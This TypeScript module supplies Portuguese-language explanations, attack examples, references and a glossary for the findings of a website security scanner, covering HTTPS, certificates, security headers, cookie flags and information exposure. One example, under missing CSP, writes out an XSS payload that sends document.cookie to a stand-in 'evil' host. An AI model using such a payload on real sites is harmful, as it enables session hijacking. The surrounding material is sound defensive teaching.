export interface ReferenciaEducativa {
  titulo: string;
  url: string;
}

export interface ConteudoEducativo {
  refId: string;
  explicacaoSimples: string;
  explicacaoTecnica: string;
  exemploAtaque: string;
  referencias: ReferenciaEducativa[];
}

export interface TermoGlossario {
  termo: string;
  definicao: string;
}

const OWASP_TLS = {
  titulo: "OWASP — Transport Layer Protection",
  url: "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html",
};

const CONTEUDO: Record<string, ConteudoEducativo> = {
  "https-ausente": {
    refId: "https-ausente",
    explicacaoSimples:
      "O site não usa conexão segura (HTTPS). Tudo que você digita pode ser lido por quem estiver na mesma rede.",
    explicacaoTecnica:
      "Sem TLS, o tráfego trafega em texto puro e é suscetível a interceptação e adulteração (man-in-the-middle). HTTPS garante confidencialidade, integridade e autenticidade do canal.",
    exemploAtaque:
      "Em uma rede Wi-Fi pública, um atacante captura o formulário de login enviado por HTTP e lê usuário e senha em claro.",
    referencias: [
      OWASP_TLS,
      { titulo: "MDN — HTTPS", url: "https://developer.mozilla.org/pt-BR/docs/Glossary/HTTPS" },
    ],
  },
  "tls-nao-confiavel": {
    refId: "tls-nao-confiavel",
    explicacaoSimples:
      "O certificado de segurança do site não pôde ser confirmado. O navegador mostra avisos e a confiança é quebrada.",
    explicacaoTecnica:
      "A cadeia de certificação está incompleta ou foi emitida por uma autoridade não confiável. Sem validação da cadeia, não há garantia da identidade do servidor.",
    exemploAtaque:
      "Um atacante apresenta um certificado autoassinado num ataque MITM; se o usuário ignora o aviso, o tráfego é interceptado.",
    referencias: [
      OWASP_TLS,
      { titulo: "MDN — Certificado TLS", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security" },
    ],
  },
  "cert-expirado": {
    refId: "cert-expirado",
    explicacaoSimples:
      "O certificado de segurança venceu. Os navegadores bloqueiam o acesso e mostram alertas vermelhos.",
    explicacaoTecnica:
      "Um certificado fora do período de validade é rejeitado pelos clientes TLS. Além de indisponibilidade, transmite percepção de descuido e pode mascarar problemas maiores.",
    exemploAtaque:
      "Usuários acostumados a ignorar avisos de certificado tornam-se alvos fáceis de páginas falsas com certificados inválidos.",
    referencias: [
      OWASP_TLS,
      { titulo: "MDN — Vida útil do certificado", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency" },
    ],
  },
  "cert-expirando": {
    refId: "cert-expirando",
    explicacaoSimples:
      "O certificado de segurança vai vencer em breve. Se não for renovado, o site ficará inacessível.",
    explicacaoTecnica:
      "A proximidade da expiração indica ausência de renovação automática. Recomenda-se ACME/Let's Encrypt com renovação agendada bem antes do vencimento.",
    exemploAtaque:
      "Uma expiração não monitorada derruba o HTTPS em produção, gerando indisponibilidade e janela para phishing.",
    referencias: [
      OWASP_TLS,
      { titulo: "Let's Encrypt — Renovação", url: "https://letsencrypt.org/docs/" },
    ],
  },
  "header-csp-ausente": {
    refId: "header-csp-ausente",
    explicacaoSimples:
      "O site não diz ao navegador de onde pode carregar scripts e conteúdo, o que facilita a injeção de código malicioso.",
    explicacaoTecnica:
      "Sem Content-Security-Policy, o navegador executa scripts inline e de qualquer origem. Uma CSP restritiva (ex.: default-src 'self') reduz a superfície de XSS bloqueando fontes não autorizadas.",
    exemploAtaque:
      "Um comentário malicioso com <script>fetch('https://evil/?c='+document.cookie)</script> é executado e envia os cookies da vítima ao atacante.",
    referencias: [
      { titulo: "OWASP — Content Security Policy", url: "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" },
      { titulo: "MDN — Content-Security-Policy", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Content-Security-Policy" },
    ],
  },
  "header-hsts-ausente": {
    refId: "header-hsts-ausente",
    explicacaoSimples:
      "O site não obriga o navegador a usar sempre HTTPS, deixando uma brecha para conexões inseguras.",
    explicacaoTecnica:
      "Sem Strict-Transport-Security, a primeira requisição pode ocorrer em HTTP e ser alvo de downgrade/SSL stripping. HSTS instrui o navegador a usar HTTPS por um período (max-age).",
    exemploAtaque:
      "Em SSL stripping, o atacante rebaixa a conexão para HTTP e intercepta o tráfego antes do redirecionamento.",
    referencias: [
      { titulo: "OWASP — HTTP Strict Transport Security", url: "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html" },
      { titulo: "MDN — Strict-Transport-Security", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Strict-Transport-Security" },
    ],
  },
  "header-xframe-ausente": {
    refId: "header-xframe-ausente",
    explicacaoSimples:
      "O site pode ser embutido em outra página, o que permite enganar o usuário a clicar em algo escondido (clickjacking).",
    explicacaoTecnica:
      "Sem X-Frame-Options (ou frame-ancestors no CSP), a página pode ser carregada em iframes de terceiros, viabilizando ataques de clickjacking.",
    exemploAtaque:
      "Um site malicioso sobrepõe um botão invisível 'Transferir' sobre um botão atraente; o clique da vítima dispara a ação real.",
    referencias: [
      { titulo: "OWASP — Clickjacking Defense", url: "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" },
      { titulo: "MDN — X-Frame-Options", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-Frame-Options" },
    ],
  },
  "header-xcto-ausente": {
    refId: "header-xcto-ausente",
    explicacaoSimples:
      "O navegador pode adivinhar o tipo de um arquivo e acabar executando algo perigoso.",
    explicacaoTecnica:
      "Sem X-Content-Type-Options: nosniff, o navegador pode reinterpretar o Content-Type (MIME sniffing), executando, por exemplo, um upload tratado como script.",
    exemploAtaque:
      "Um arquivo enviado como imagem, mas contendo JavaScript, é interpretado como script pelo navegador e executado.",
    referencias: [
      { titulo: "MDN — X-Content-Type-Options", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-Content-Type-Options" },
      { titulo: "OWASP — Secure Headers", url: "https://owasp.org/www-project-secure-headers/" },
    ],
  },
  "header-referrer-ausente": {
    refId: "header-referrer-ausente",
    explicacaoSimples:
      "URLs internas do seu site podem vazar para outros sites quando o usuário clica em links externos.",
    explicacaoTecnica:
      "Sem Referrer-Policy, o cabeçalho Referer completo é enviado a terceiros, expondo caminhos e parâmetros sensíveis. Recomenda-se strict-origin-when-cross-origin.",
    exemploAtaque:
      "Um link para um site externo carrega um Referer como https://app/conta/12345?token=..., revelando o token a terceiros.",
    referencias: [
      { titulo: "MDN — Referrer-Policy", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Referrer-Policy" },
      { titulo: "OWASP — Secure Headers", url: "https://owasp.org/www-project-secure-headers/" },
    ],
  },
  "header-permissions-ausente": {
    refId: "header-permissions-ausente",
    explicacaoSimples:
      "O site não restringe recursos sensíveis como câmera, microfone e localização.",
    explicacaoTecnica:
      "Sem Permissions-Policy, APIs poderosas do navegador ficam disponíveis por padrão, ampliando o impacto de um XSS ou de scripts de terceiros comprometidos.",
    exemploAtaque:
      "Um script de terceiros comprometido solicita acesso à câmera/geolocalização sem que a aplicação tenha bloqueado essas APIs.",
    referencias: [
      { titulo: "MDN — Permissions-Policy", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy" },
      { titulo: "OWASP — Secure Headers", url: "https://owasp.org/www-project-secure-headers/" },
    ],
  },
  "cookie-sem-secure": {
    refId: "cookie-sem-secure",
    explicacaoSimples:
      "Um cookie pode ser enviado por conexão insegura e ser capturado por quem espiona a rede.",
    explicacaoTecnica:
      "Sem o atributo Secure, o cookie é transmitido também em HTTP. Em redes não confiáveis, isso permite a captura de cookies de sessão.",
    exemploAtaque:
      "Um atacante na mesma rede captura o cookie de sessão enviado por HTTP e sequestra a sessão da vítima.",
    referencias: [
      { titulo: "OWASP — Session Management", url: "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" },
      { titulo: "MDN — Set-Cookie (Secure)", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Set-Cookie" },
    ],
  },
  "cookie-sem-httponly": {
    refId: "cookie-sem-httponly",
    explicacaoSimples:
      "Um cookie pode ser lido por scripts da página, então um ataque de XSS consegue roubá-lo.",
    explicacaoTecnica:
      "Sem HttpOnly, o cookie é acessível via document.cookie, ampliando o impacto de XSS (roubo de sessão). Cookies de sessão devem ser HttpOnly.",
    exemploAtaque:
      "Um XSS executa document.cookie e envia o cookie de sessão para um servidor controlado pelo atacante.",
    referencias: [
      { titulo: "OWASP — XSS Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
      { titulo: "MDN — Set-Cookie (HttpOnly)", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Set-Cookie" },
    ],
  },
  "cookie-sem-samesite": {
    refId: "cookie-sem-samesite",
    explicacaoSimples:
      "O cookie é enviado mesmo quando a requisição parte de outro site, abrindo espaço para fraudes (CSRF).",
    explicacaoTecnica:
      "Sem SameSite, o cookie acompanha requisições cross-site, viabilizando CSRF. SameSite=Lax/Strict limita o envio a contextos de mesma origem.",
    exemploAtaque:
      "Uma página maliciosa submete um formulário para o banco da vítima; o cookie de sessão é enviado junto e a transferência é autorizada.",
    referencias: [
      { titulo: "OWASP — CSRF Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" },
      { titulo: "MDN — SameSite cookies", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Set-Cookie/SameSite" },
    ],
  },
  "exposicao-server": {
    refId: "exposicao-server",
    explicacaoSimples:
      "O site revela qual software de servidor usa, o que ajuda um atacante a procurar falhas conhecidas.",
    explicacaoTecnica:
      "O cabeçalho Server com software/versão facilita o reconhecimento (fingerprinting) e o direcionamento de exploits para CVEs específicos.",
    exemploAtaque:
      "Vendo 'Server: Apache/2.4.49', o atacante tenta diretamente exploits conhecidos daquela versão.",
    referencias: [
      { titulo: "OWASP — Information Leakage", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      { titulo: "MDN — Server header", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server" },
    ],
  },
  "exposicao-xpoweredby": {
    refId: "exposicao-xpoweredby",
    explicacaoSimples:
      "O site informa qual tecnologia de backend utiliza, dando dicas ao atacante.",
    explicacaoTecnica:
      "O cabeçalho X-Powered-By expõe o stack (ex.: PHP, Express), reduzindo o esforço de reconhecimento. Deve ser desativado em produção.",
    exemploAtaque:
      "Com 'X-Powered-By: PHP/5.6', o atacante foca em vulnerabilidades específicas dessa versão de PHP.",
    referencias: [
      { titulo: "OWASP — Fingerprint Web Server", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      { titulo: "MDN — X-Powered-By", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" },
    ],
  },
  "exposicao-comentarios": {
    refId: "exposicao-comentarios",
    explicacaoSimples:
      "Comentários esquecidos no código da página podem revelar informações internas.",
    explicacaoTecnica:
      "Comentários HTML podem conter caminhos, credenciais de teste ou lógica de negócio. Devem ser removidos no build de produção.",
    exemploAtaque:
      "Um comentário <!-- TODO: usar admin/admin123 --> deixado no HTML revela credenciais a quem lê o código-fonte.",
    referencias: [
      { titulo: "OWASP — Review Webpage Comments", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      { titulo: "MDN — Comentários HTML", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTML/Comments" },
    ],
  },
  "perf-tempo-elevado": {
    refId: "perf-tempo-elevado",
    explicacaoSimples:
      "O site demora a responder, o que piora a experiência e pode indicar falta de otimização.",
    explicacaoTecnica:
      "Tempos altos podem refletir ausência de cache/CDN e gargalos no backend; também ampliam o impacto de ataques de negação de serviço.",
    exemploAtaque:
      "Endpoints lentos amplificam um ataque de negação de serviço, esgotando recursos com poucas requisições.",
    referencias: [
      { titulo: "MDN — Performance Web", url: "https://developer.mozilla.org/pt-BR/docs/Web/Performance" },
      { titulo: "web.dev — Métricas", url: "https://web.dev/metrics/" },
    ],
  },
  "perf-sem-compressao": {
    refId: "perf-sem-compressao",
    explicacaoSimples:
      "O site envia respostas sem compactar, aumentando o tráfego e o tempo de carregamento.",
    explicacaoTecnica:
      "Sem Gzip/Brotli, respostas trafegam maiores que o necessário. A compressão reduz banda e melhora o tempo de carregamento.",
    exemploAtaque:
      "Não é uma falha de segurança direta, mas o excesso de tráfego encarece a infraestrutura e degrada a disponibilidade sob carga.",
    referencias: [
      { titulo: "MDN — Compressão HTTP", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Compression" },
      { titulo: "web.dev — Text compression", url: "https://web.dev/uses-text-compression/" },
    ],
  },
  "perf-sem-cache": {
    refId: "perf-sem-cache",
    explicacaoSimples:
      "O site não orienta o navegador a guardar recursos, recarregando tudo a cada visita.",
    explicacaoTecnica:
      "Sem Cache-Control adequado, recursos estáticos são rebaixados a cada visita. Cache com versionamento de assets melhora a performance e reduz carga.",
    exemploAtaque:
      "Sem cache, cada visita refaz todas as requisições, aumentando a carga no servidor e o tempo de resposta sob pico.",
    referencias: [
      { titulo: "MDN — Cache-Control", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/Cache-Control" },
      { titulo: "web.dev — HTTP cache", url: "https://web.dev/http-cache/" },
    ],
  },
};

const GLOSSARIO: TermoGlossario[] = [
  { termo: "XSS (Cross-Site Scripting)", definicao: "Injeção de scripts maliciosos numa página, executados no navegador da vítima." },
  { termo: "CSRF (Cross-Site Request Forgery)", definicao: "Ataque que faz o navegador da vítima enviar requisições autenticadas sem o consentimento dela." },
  { termo: "Clickjacking", definicao: "Enganar o usuário a clicar em algo invisível, sobrepondo o site em um iframe." },
  { termo: "MIME sniffing", definicao: "Quando o navegador adivinha o tipo de um recurso, podendo executar conteúdo perigoso." },
  { termo: "CSP (Content-Security-Policy)", definicao: "Cabeçalho que restringe de onde a página pode carregar recursos." },
  { termo: "HSTS", definicao: "Cabeçalho que força o navegador a usar sempre HTTPS naquele domínio." },
  { termo: "CORS", definicao: "Mecanismo que controla quais origens podem acessar um recurso via navegador." },
  { termo: "TLS/SSL", definicao: "Protocolos que cifram a conexão entre cliente e servidor (a base do HTTPS)." },
  { termo: "SPF", definicao: "Registro DNS que lista quais servidores podem enviar e-mail por um domínio." },
  { termo: "DKIM", definicao: "Assinatura criptográfica que comprova a integridade e a origem de um e-mail." },
  { termo: "DMARC", definicao: "Política que define o que fazer com e-mails que falham SPF/DKIM." },
  { termo: "MITM (Man-in-the-Middle)", definicao: "Atacante que se posiciona entre as partes para ler ou alterar o tráfego." },
];

export function obterConteudoEducativo(refId: string): ConteudoEducativo | null {
  return CONTEUDO[refId] ?? null;
}

export function listarConteudos(): ConteudoEducativo[] {
  return Object.values(CONTEUDO);
}

export function listarGlossario(): TermoGlossario[] {
  return GLOSSARIO;
}
